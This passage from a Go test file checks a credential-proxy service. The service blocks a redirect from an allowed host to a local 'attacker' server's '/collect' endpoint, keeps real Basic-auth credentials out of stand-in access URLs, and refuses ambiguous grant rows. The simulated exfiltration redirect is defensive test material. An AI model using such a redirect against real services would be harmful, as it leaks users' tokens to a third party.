		})
	}
}

func TestFinancialDestinationPolicyAlsoGuardsUnauthenticatedRedirects(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var escaped atomic.Int32
	attacker := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { escaped.Add(1) }))
	defer attacker.Close()
	allowed := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { http.Redirect(w, r, attacker.URL+"/collect", 307) }))
	defer allowed.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Bank", Recipe: "bearer", Origin: "https://bank.example.test", Secret: "private-bank-token"}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID, PermittedEgress: []string{allowed.URL}})
	require.NoError(t, err)
	_, err = doRequest(t, s, 1, testGate(t, allowed.URL, attacker.URL), allowed.URL+"/forward")
	assert.ErrorIs(t, err, ErrEgress)
	assert.Zero(t, escaped.Load())
}

func TestBasicClientCanUseOnlyAStandinAccessURL(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var provider *httptest.Server
	provider = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "/private-access/accounts", r.URL.Path)
		user, password, ok := r.BasicAuth()
		assert.True(t, ok)
		assert.Equal(t, "real-api-user", user)
		assert.Equal(t, "real-api-password-7592", password)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"accounts":[],"echo":%q}`, r.Header.Get("Authorization"))
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Private API", Recipe: "basic", AccessURL: strings.Replace(provider.URL, "https://", "https://real-api-user:real-api-password-7592@", 1) + "/private-access"}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	token, err := s.Standin(ctx, 1, "app", c.ID)
	require.NoError(t, err)
	access, err := url.Parse(token.AccessURL)
	require.NoError(t, err)
	assert.Equal(t, "exhibit", access.User.Username())
	password, ok := access.User.Password()
	require.True(t, ok)
	assert.Equal(t, token.Value, password)
	assert.NotContains(t, token.AccessURL, "real-api")
	// Generic clients extract Basic auth from
	// the access URL because browsers prohibit fetch URLs with userinfo.
	user := access.User.Username()
	access.User = nil
	access.Path += "/accounts"
	req, err := http.NewRequest(http.MethodGet, access.String(), nil)
	require.NoError(t, err)
	req.SetBasicAuth(user, password)
	response, err := s.Do(ctx, 1, "app", req, testGate(t, provider.URL))
	require.NoError(t, err)
	assert.NotContains(t, string(response.Body), "real-api")
	assert.NotContains(t, string(response.Body), base64.StdEncoding.EncodeToString([]byte("real-api-user:real-api-password-7592")))
	assert.Contains(t, string(response.Body), token.Value)
}

func TestLegacyAmbiguousBindingsRefuseBeforeNetwork(t *testing.T) {
	s, path := testService(t)
	ctx := context.Background()
	var received atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { received.Add(1) }))
	defer provider.Close()
	first, err := s.Create(ctx, 1, CreateRequest{Name: "First", Recipe: "bearer", Origin: provider.URL, Secret: "first-secret"}, UnlimitedLimits())
	require.NoError(t, err)
	second, err := s.Create(ctx, 1, CreateRequest{Name: "Second", Recipe: "bearer", Origin: provider.URL, Secret: "second-secret"}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: first.ID})
	require.NoError(t, err)
	// Simulate a previously deployed or externally edited ambiguous row. The
	// store's current attachment path rejects this in its own transaction.
	db, err := sql.Open("sqlite", path)
	require.NoError(t, err)
	defer db.Close()
	_, err = db.Exec(`INSERT INTO artifact_connection_grants(artifact_id,connection_id,viewer_id) VALUES('app',?,1)`, second.ID)
	require.NoError(t, err)
	_, err = doRequest(t, s, 1, testGate(t, provider.URL), provider.URL+"/data")
	assert.ErrorIs(t, err, store.ErrConnectionOverlap)
	assert.Zero(t, received.Load())
}
